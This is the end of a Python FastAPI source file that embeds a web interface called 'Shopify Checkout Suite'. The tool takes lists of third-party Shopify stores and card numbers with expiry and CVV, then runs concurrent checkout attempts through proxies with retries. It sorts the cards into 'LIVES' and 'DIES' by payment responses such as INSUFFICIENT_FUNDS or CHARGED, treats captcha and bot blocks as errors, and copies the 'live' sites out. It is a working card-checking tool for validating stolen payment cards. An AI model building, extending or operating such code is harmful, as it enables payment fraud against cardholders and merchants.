                inset 0 1px 0 rgba(255, 255, 255, 0.08),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.825rem;
            text-align: left;
        }

        th {
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.03));
            padding: 0.95rem 1rem;
            color: var(--text-muted);
            font-weight: 700;
            border-bottom: 1px solid var(--edge-dim);
            text-transform: uppercase;
            font-size: 0.72rem;
            letter-spacing: 0.08em;
        }

        td {
            padding: 0.95rem 1rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            font-family: var(--font-mono);
        }

        tbody tr { transition: background 0.18s ease; }
        tbody tr:hover {
            background: linear-gradient(90deg, rgba(139, 92, 246, 0.08), rgba(56, 189, 248, 0.05));
        }

        .badge-live {
            color: var(--success);
            font-weight: 700;
            text-shadow: 0 0 14px var(--success-glow), 0 0 30px var(--success-glow);
        }
        .badge-die {
            color: var(--danger);
            font-weight: 700;
            text-shadow: 0 0 12px var(--danger-glow);
        }
        .badge-error {
            color: var(--warning);
            font-weight: 700;
            text-shadow: 0 0 12px var(--warning-glow);
        }

        /* Custom scrollbars for the liquid feel */
        ::-webkit-scrollbar { width: 10px; height: 10px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, rgba(196, 181, 253, 0.35), rgba(139, 92, 246, 0.25));
            border-radius: 10px;
            border: 2px solid transparent;
            background-clip: padding-box;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(180deg, rgba(196, 181, 253, 0.55), rgba(139, 92, 246, 0.4));
            background-clip: padding-box;
        }

        /* Respect reduced motion */
        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>
<body>

<div class="grain-overlay"></div>

<div class="dashboard">
    <!-- Header -->
    <div class="top-bar">
        <div class="brand">
            <div class="brand-icon">⚡</div>
            <div class="brand-title">
                <h1>Shopify Checkout Suite</h1>
                <p>Real-time Gateway &amp; Card Validator</p>
            </div>
        </div>

        <div class="sys-info">
            <div class="sys-chip">API: <span class="val" id="st-status">Online 🟢</span></div>
            <div class="sys-chip">Cards: <span class="val" id="st-cards">0</span></div>
        </div>
    </div>

    <!-- Main Card -->
    <div class="main-card">
        <div class="input-grid">
            <div class="input-box">
                <label>
                    🌐 Shopify Sites (one per line)
                    <span><button onclick="cleanInputSites()">✂ Clean Text (URLs Only)</button></span>
                </label>
                <textarea id="inp-sites" placeholder="example1.myshopify.com&#10;demo-store.com&#10;https://store.brand.com"></textarea>
            </div>

            <div class="input-box">
                <label>
                    💳 Cards (one per line)
                    <span><button onclick="cleanInputCards()">✂ Clean Text (Cards Only)</button></span>
                </label>
                <textarea id="inp-cards" placeholder="4532018890123456|12|28|123&#10;5424180011223344|05|2027|999&#10;(Empty = use cards.txt from API)"></textarea>
            </div>
        </div>

        <!-- Toolbar -->
        <div class="toolbar">
            <button class="btn-action btn-start" id="btn-start" onclick="startBatch()">▷ START</button>
            <button class="btn-action btn-pause" id="btn-pause" onclick="togglePause()" disabled>❚❚ PAUSE</button>
            <button class="btn-action btn-cancel" id="btn-stop" onclick="stopBatch()" disabled>■ CANCEL</button>
            <button class="btn-action" onclick="clearAll()">🗑 CLEAR</button>
        </div>

        <!-- Config Strip -->
        <div class="config-strip">
            <div class="config-item">
                Endpoint:
                <select id="inp-endpoint">
                    <option value="/check">⚡ /check (Fast Validator)</option>
                    <option value="/shopify">🛒 /shopify (Full Checkout)</option>
                </select>
            </div>

            <div class="config-item">
                Max Price ($):
                <input type="number" id="inp-max-price" value="500" step="5" min="1" style="width:82px;">
            </div>

            <div class="config-item">
                Concurrency:
                <select id="inp-threads">
                    <option value="1">1 at a time</option>
                    <option value="3" selected>3 simultaneous</option>
                    <option value="5">5 simultaneous</option>
                    <option value="10">10 simultaneous</option>
                </select>
            </div>

            <div class="config-item">
                Proxy:
                <input type="text" id="inp-proxy" placeholder="ip:port or ip:port:user:pass" style="width:180px;">
            </div>

            <div class="config-item">
                Retry on Error:
                <select id="inp-retries">
                    <option value="1">1x</option>
                    <option value="2">2x</option>
                    <option value="3" selected>3x</option>
                </select>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs-nav">
            <div class="tab-item tab-lives active" id="tab-btn-lives" onclick="switchTab('lives')">LIVES</div>
            <div class="tab-item tab-dies" id="tab-btn-dies" onclick="switchTab('dies')">DIES</div>
            <div class="tab-item tab-errors" id="tab-btn-errors" onclick="switchTab('errors')">ERRORS</div>
        </div>

        <!-- Counters -->
        <div class="counters-strip">
            <div class="counter-card">
                <div class="counter-lbl">TOTAL</div>
                <div class="counter-num totales" id="c-totales">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">PROCESSED</div>
                <div class="counter-num procesados" id="c-procesados">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">PENDING</div>
                <div class="counter-num pendientes" id="c-pendientes">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">LIVES</div>
                <div class="counter-num lives" id="c-lives">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">DIES</div>
                <div class="counter-num dies" id="c-dies">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">ERRORS</div>
                <div class="counter-num errores" id="c-errores">0</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">ELAPSED</div>
                <div class="counter-num tiempo" id="c-tiempo">00:00</div>
            </div>
            <div class="counter-card">
                <div class="counter-lbl">REMAINING</div>
                <div class="counter-num restante" id="c-restante">00:00</div>
            </div>
        </div>

        <!-- Debug Monitor -->
        <div class="debug-monitor">
            <div style="display:flex; align-items:center; gap:0.85rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                <span class="badge">DEBUG LOG</span>
                <span id="dbg-status" style="color: var(--text-main); font-weight: 500;">Awaiting execution...</span>
            </div>
            <div id="dbg-spinner" style="display:none; color: var(--violet); font-weight:700; text-shadow: 0 0 16px var(--violet-glow);">⚙ PROCESSING...</div>
        </div>

        <!-- Output -->
        <div class="output-section">
            <div class="output-actions">
                <button class="btn-glass btn-glass-green" onclick="copyOnlyLiveSites()">🌐 COPY LIVE SITES</button>
                <button class="btn-glass btn-glass-violet" onclick="copyActiveTabContent()">📋 COPY TAB LINES</button>
                <button class="btn-glass btn-glass-amber" onclick="clearErrors()">🧹 CLEAR ERRORS</button>
                <button class="btn-glass btn-glass-rose" onclick="clearDies()">🧹 CLEAR DIES</button>
            </div>
            <textarea id="output-textarea" class="output-textarea" readonly placeholder="Results will appear here..."></textarea>
        </div>

        <!-- Table -->
        <div class="table-area">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Shopify Site</th>
                        <th>Status</th>
                        <th>Card Used</th>
                        <th>Gateway / Response</th>
                        <th>Product / Price</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody id="results-body">
                    <tr>
                        <td colspan="7" style="text-align:center; padding:2rem; color:var(--text-dim);">Awaiting test start...</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    let isRunning = false;
    let isPaused = false;
    let stopRequested = false;
    let resultsList = [];
    let activeTab = 'lives';

    let timerInterval = null;
    let elapsedSeconds = 0;

    async function loadHealth() {
        try {
            const res = await fetch('/health');
            if (res.ok) {
                const data = await res.json();
                document.getElementById('st-status').innerText = 'Online 🟢';
                document.getElementById('st-cards').innerText = data.cards_loaded || 0;
            }
        } catch (e) {
            document.getElementById('st-status').innerText = 'Error 🔴';
        }
    }
    loadHealth();

    function formatTimer(sec) {
        const m = Math.floor(sec / 60).toString().padStart(2, '0');
        const s = (sec % 60).toString().padStart(2, '0');
        return `${m}:${s}`;
    }

    function switchTab(tab) {
        activeTab = tab;
        document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
        document.getElementById(`tab-btn-${tab}`).classList.add('active');
        renderTabContent();
    }

    function clearAll() {
        resultsList = [];
        elapsedSeconds = 0;
        document.getElementById('c-totales').innerText = '0';
        document.getElementById('c-procesados').innerText = '0';
        document.getElementById('c-pendientes').innerText = '0';
        document.getElementById('c-lives').innerText = '0';
        document.getElementById('c-dies').innerText = '0';
        document.getElementById('c-errores').innerText = '0';
        document.getElementById('c-tiempo').innerText = '00:00';
        document.getElementById('c-restante').innerText = '00:00';
        document.getElementById('output-textarea').value = '';
        document.getElementById('results-body').innerHTML = `<tr><td colspan="7" style="text-align:center; padding:2rem; color:var(--text-dim);">Awaiting test start...</td></tr>`;
    }

    function updateCounters(total, completed) {
        const lives = resultsList.filter(r => r.isLive).length;
        const dies = resultsList.filter(r => !r.isLive && !r.isError).length;
        const errores = resultsList.filter(r => r.isError).length;
        const pendientes = Math.max(0, total - completed);

        document.getElementById('c-totales').innerText = total;
        document.getElementById('c-procesados').innerText = completed;
        document.getElementById('c-pendientes').innerText = pendientes;
        document.getElementById('c-lives').innerText = lives;
        document.getElementById('c-dies').innerText = dies;
        document.getElementById('c-errores').innerText = errores;

        if (completed > 0 && isRunning) {
            const avgSecPerItem = elapsedSeconds / completed;
            const remSec = Math.round(avgSecPerItem * pendientes);
            document.getElementById('c-restante').innerText = formatTimer(remSec);
        } else if (completed === total) {
            document.getElementById('c-restante').innerText = '00:00';
        }
    }

    function renderTabContent() {
        let filtered = [];
        if (activeTab === 'lives') filtered = resultsList.filter(r => r.isLive);
        if (activeTab === 'dies') filtered = resultsList.filter(r => !r.isLive && !r.isError);
        if (activeTab === 'errors') filtered = resultsList.filter(r => r.isError);

        const lines = filtered.map(item => {
            const cardStr = item.usedCard ? ` | ${item.usedCard}` : '';
            const prodStr = item.product ? ` | ${item.product} ($${item.price})` : '';
            return `${item.site} | ${item.statusLabel}${cardStr} | ${item.gate}${prodStr}`;
        });
        document.getElementById('output-textarea').value = lines.join('\\n');

        const tbody = document.getElementById('results-body');
        tbody.innerHTML = '';

        if (filtered.length === 0) {
            tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:2rem; color:var(--text-dim);">No results in this tab (${activeTab.toUpperCase()}).</td></tr>`;
            return;
        }

        filtered.forEach((item, idx) => {
            const tr = document.createElement('tr');
            let badgeClass = 'badge-die';
            if (item.isLive) badgeClass = 'badge-live';
            if (item.isError) badgeClass = 'badge-error';

            tr.innerHTML = `
                <td>${idx + 1}</td>
                <td><a href="${item.site.startsWith('http') ? item.site : 'https://' + item.site}" target="_blank" style="color:var(--text-main); font-weight:600; text-decoration:none;">${item.site}</a></td>
                <td><span class="${badgeClass}">${item.statusLabel}</span></td>
                <td><span style="color:var(--text-muted);">${item.usedCard || 'API Default'}</span></td>
                <td><strong>${item.gate || 'Shopify'}</strong> — ${item.card_response || item.detail || 'OK'}</td>
                <td>${item.product ? item.product + ' ($' + item.price + ')' : '-'}</td>
                <td>${item.time ? item.time : (item.elapsed ? item.elapsed + 'ms' : '-')}</td>
            `;
            tbody.appendChild(tr);
        });
    }

    async function checkSingleItemWithRetry(site, card, proxy, endpoint, maxPrice) {
        if (stopRequested) return null;

        const url = new URL(endpoint, window.location.origin);
        url.searchParams.append('site', site);
        if (card) url.searchParams.append(endpoint === '/shopify' ? 'cc' : 'card', card);
        if (proxy) url.searchParams.append('proxy', proxy);
        if (maxPrice) url.searchParams.append('max_price', maxPrice);

        const t0 = performance.now();
        try {
            const res = await fetch(url);
            const elapsed = Math.round(performance.now() - t0);
            const data = await res.json();

            let isLive = false;
            let isError = false;
            let statusLabel = '';

            const respUpper = (data.card_response || data.Response || data.reason || '').toUpperCase();
            const detailUpper = (data.detail || '').toUpperCase();
            const combinedUpper = `${respUpper} ${detailUpper}`;

            const liveKeywords = ["INVALID_CVC", "INSUFFICIENT_FUNDS", "3DS_REQUIRED", "ORDER_PLACED", "EXPIRED_CARD", "APPROVED", "CHARGED"];
            const isExplicitLive = liveKeywords.some(k => combinedUpper.includes(k));

            const errorKeywords = [
                "CAPTCHA", "CHALLENGE", "BOT", "CHECKPOINTDENIED",
                "NO_SHOPIFY_PAYMENTS_GATEWAY", "NO_PRODUCT", "CART_FAILED",
                "NO_CHEAP_PRODUCTS", "SITE_REQUIRES_LOGIN", "SESSION_EXPIRED",
                "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN", "SUBMIT_FAILED",
                "PRICE_OVER_MAX", "PRICE_OVER",
                "THROTTLED", "TIMEOUT", "NETWORK_ERROR", "GRAPHQL_ERROR"
            ];
            const isExplicitError = errorKeywords.some(k => combinedUpper.includes(k));

            if (isExplicitError) {
                isError = true;
                statusLabel = data.card_response || data.Response || data.reason || 'ERROR';
            } else if (res.status >= 400 || data.error) {
                isError = true;
                statusLabel = data.error || 'ERROR';
            } else if (data.valid || data.approved === 'True' || data.approved === true || isExplicitLive) {
                isLive = true;
                statusLabel = data.card_response || data.Response || 'LIVE / APPROVED';
            } else {
                statusLabel = data.card_response || data.Response || data.reason || 'DIE / DECLINED';
            }

            return {
                site: site,
                usedCard: card,
                isLive: isLive,
                isError: isError,
                statusLabel: statusLabel,
                gate: data.gate || data.Gate || 'Shopify',
                card_response: data.card_response || data.Response || '',
                product: data.product || data.Product || '',
                price: data.price || data.Price || '',
                detail: data.detail || data.reason || '',
                time: data.time || data.Time || '',
                elapsed: elapsed
            };

        } catch (err) {
            const elapsed = Math.round(performance.now() - t0);
            return {
                site: site,
                usedCard: card,
                isLive: false,
                isError: true,
                statusLabel: 'NETWORK_ERROR',
                gate: 'N/A',
                detail: err.message,
                elapsed: elapsed
            };
        }
    }

    async function startBatch() {
        const sitesRaw = document.getElementById('inp-sites').value.trim();
        if (!sitesRaw) {
            alert('Please provide at least one site to test.');
            return;
        }

        const sites = sitesRaw.split('\\n').map(s => s.trim()).filter(s => s.length > 0);
        const cardsRaw = document.getElementById('inp-cards').value.trim();
        const cards = cardsRaw ? cardsRaw.split('\\n').map(c => c.trim()).filter(c => c.length > 0) : [];
        const proxy = document.getElementById('inp-proxy').value.trim();
        const endpoint = document.getElementById('inp-endpoint').value;
        const maxPrice = document.getElementById('inp-max-price').value.trim();
        const threads = parseInt(document.getElementById('inp-threads').value, 10);

        let tasks = [];
        if (cards.length > 0) {
            for (let i = 0; i < Math.max(sites.length, cards.length); i++) {
                const site = sites[i % sites.length];
                const card = cards[i % cards.length];
                tasks.push({ site, card });
            }
        } else {
            for (const site of sites) {
                tasks.push({ site, card: '' });
            }
        }

        isRunning = true;
        isPaused = false;
        stopRequested = false;

        document.getElementById('btn-start').disabled = true;
        document.getElementById('btn-pause').disabled = false;
        document.getElementById('btn-stop').disabled = false;

        elapsedSeconds = 0;
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            if (isRunning && !isPaused) {
                elapsedSeconds++;
                document.getElementById('c-tiempo').innerText = formatTimer(elapsedSeconds);
            }
        }, 1000);

        let completed = 0;
        const total = tasks.length;
        updateCounters(total, completed);

        document.getElementById('dbg-spinner').style.display = 'block';
        document.getElementById('dbg-status').innerText = `Starting ${threads} worker(s)... Queue total: ${total} tests.`;

        let taskIndex = 0;
        async function worker(workerId) {
            while (taskIndex < tasks.length && !stopRequested) {
                while (isPaused && isRunning && !stopRequested) {
                    document.getElementById('dbg-status').innerText = `❚❚ PAUSED. Awaiting resume...`;
                    await new Promise(r => setTimeout(r, 200));
                }
                if (stopRequested) break;

                const currentTask = tasks[taskIndex++];
                const cardDisp = currentTask.card ? (currentTask.card.substring(0, 6) + '...' + currentTask.card.slice(-4)) : 'API Default';
                document.getElementById('dbg-status').innerText = `[Thread ${workerId}] Testing: ${currentTask.site} | CC: ${cardDisp}`;

                const result = await checkSingleItemWithRetry(currentTask.site, currentTask.card, proxy, endpoint, maxPrice);
                if (result) {
                    resultsList.unshift(result);
                }
                completed++;
                updateCounters(total, completed);
                renderTabContent();
            }
        }

        const workers = [];
        const threadCount = cards.length > 0 ? Math.min(threads, cards.length) : Math.min(threads, sites.length);
        for (let i = 0; i < Math.max(1, threadCount); i++) {
            workers.push(worker(i + 1));
        }

        await Promise.all(workers);

        isRunning = false;
        clearInterval(timerInterval);
        document.getElementById('dbg-spinner').style.display = 'none';
        document.getElementById('dbg-status').innerText = stopRequested ? `■ Tests cancelled by user. Completed: ${completed}/${total}.` : `✅ Tests completed successfully! Processed ${completed}/${total}.`;
        document.getElementById('btn-start').disabled = false;
        document.getElementById('btn-pause').disabled = true;
        document.getElementById('btn-stop').disabled = true;
        document.getElementById('btn-pause').innerText = '❚❚ PAUSE';
    }

    function togglePause() {
        if (!isRunning) return;
        isPaused = !isPaused;
        const btn = document.getElementById('btn-pause');
        if (isPaused) {
            btn.innerText = '▶ RESUME';
            btn.style.background = 'linear-gradient(135deg, rgba(251, 191, 36, 0.42), rgba(146, 64, 14, 0.3))';
        } else {
            btn.innerText = '❚❚ PAUSE';
            btn.style.background = 'linear-gradient(135deg, rgba(251, 191, 36, 0.28), rgba(146, 64, 14, 0.22))';
        }
    }

    function stopBatch() {
        if (isRunning) {
            stopRequested = true;
            isRunning = false;
            clearInterval(timerInterval);
            document.getElementById('btn-stop').disabled = true;
            document.getElementById('btn-pause').disabled = true;
            document.getElementById('btn-start').disabled = false;
        }
    }

    function cleanInputSites() {
        const txt = document.getElementById('inp-sites').value;
        if (!txt.trim()) return;

        const lines = txt.split('\\n');
        const cleaned = [];
        const urlPattern = /(https?:\\/\\/[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+)|([a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+)/i;

        lines.forEach(l => {
            l = l.trim();
            if (!l) return;

            if (l.includes('|')) {
                l = l.split('|')[0].trim();
            }

            const m = l.match(urlPattern);
            if (m) {
                let rawMatch = m[0].trim();
                let fullUrl = rawMatch.startsWith('http') ? rawMatch : 'https://' + rawMatch;
                try {
                    const parsed = new URL(fullUrl);
                    cleaned.push(parsed.origin);
                } catch(e) {
                    cleaned.push(fullUrl);
                }
            }
        });

        const uniqueCleaned = [...new Set(cleaned)];
        document.getElementById('inp-sites').value = uniqueCleaned.join('\\n');
    }

    function cleanInputCards() {
        const txt = document.getElementById('inp-cards').value;
        if (!txt.trim()) return;

        const lines = txt.split('\\n');
        const cleaned = [];
        const pattern = /(\\d{13,19})\\s*[\\s\\|/:]\\s*(\\d{1,2})\\s*[\\s\\|/:]\\s*(\\d{2,4})\\s*[\\s\\|/:]\\s*(\\d{3,4})/;

        lines.forEach(l => {
            l = l.trim();
            if (!l) return;
            const m = l.match(pattern);
            if (m) {
                let cc = m[1];
                let mm = m[2].padStart(2, '0');
                let yy = m[3].length === 4 ? m[3].substring(2) : m[3];
                let cvv = m[4];
                cleaned.push(`${cc}|${mm}|${yy}|${cvv}`);
            }
        });

        document.getElementById('inp-cards').value = cleaned.join('\\n');
    }

    function copyOnlyLiveSites() {
        const liveItems = resultsList.filter(r => r.isLive);
        if (liveItems.length === 0) {
            alert('No Live sites found to copy.');
            return;
        }
        const uniqueSites = [...new Set(liveItems.map(item => item.site))];
        navigator.clipboard.writeText(uniqueSites.join('\\n'));
        alert(`${uniqueSites.length} Live site(s) copied to clipboard!`);
    }

    function clearErrors() {
        resultsList = resultsList.filter(r => !r.isError);
        updateCounters(resultsList.length, resultsList.length);
        renderTabContent();
    }

    function clearDies() {
        resultsList = resultsList.filter(r => r.isLive || r.isError);
        updateCounters(resultsList.length, resultsList.length);
        renderTabContent();
    }

    function copyActiveTabContent() {
        const text = document.getElementById('output-textarea').value;
        if (!text) {
            alert('No content in the current tab to copy.');
            return;
        }
        navigator.clipboard.writeText(text);
        alert('Current tab content copied to clipboard!');
    }
</script>

</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
@app.get("/ui", response_class=HTMLResponse)
async def index_route():
    """Serve the interactive Web UI for testing Shopify stores."""
    return HTMLResponse(content=INDEX_HTML)


# ---------------------------------------------------------------------------
# Middleware: per-request timing header + stats + file logging
# ---------------------------------------------------------------------------
@app.middleware("http")
async def add_timing(request: Request, call_next):
    from starlette.responses import Response as StarletteResponse
    t0   = time.time()
    resp = await call_next(request)

    elapsed_ms = (time.time() - t0) * 1000
    resp.headers["X-Response-Time"] = f"{elapsed_ms:.1f}ms"

    _stats["total_requests"] += 1
    path = request.url.path
    _stats[f"requests_{path.strip('/').replace('/', '_') or 'root'}"] += 1

    # Read and re-stream the response body for logging
    body = b""
    async for chunk in resp.body_iterator:
        body += chunk if isinstance(chunk, bytes) else chunk.encode()

    # Log asynchronously (fire-and-forget so it never blocks)
    asyncio.create_task(_log_incoming(request, body, resp.status_code, elapsed_ms))

    # Return reconstructed response
    return StarletteResponse(
        content=body,
        status_code=resp.status_code,
        headers=dict(resp.headers),
        media_type=resp.media_type,
    )


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(
        f"\n{'='*60}\n"
        f"  Shopify Validator API  v3.1\n"
        f"  Port:            {PORT}\n"
        f"  Workers:         {WORKERS}\n"
        f"  Pool:            {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
        f"  Site concurrency:{SITE_CONCURRENCY}\n"
        f"  Product cache:   {int(CACHE_TTL)}s TTL\n"
        f"  Max price:       ${MAX_PRICE:.2f}\n"
        f"  Cards file:      {CARDS_FILE}\n"
        f"{'='*60}\n"
    )
    uvicorn.run(
        "api:app",
        host="0.0.0.0",
        port=PORT,
        workers=WORKERS,
        loop="auto",
        http="auto",
        log_level="warning",
        access_log=False,
        timeout_keep_alive=30,
        limit_concurrency=5000,
        limit_max_requests=100_000,
        backlog=4096,
    )
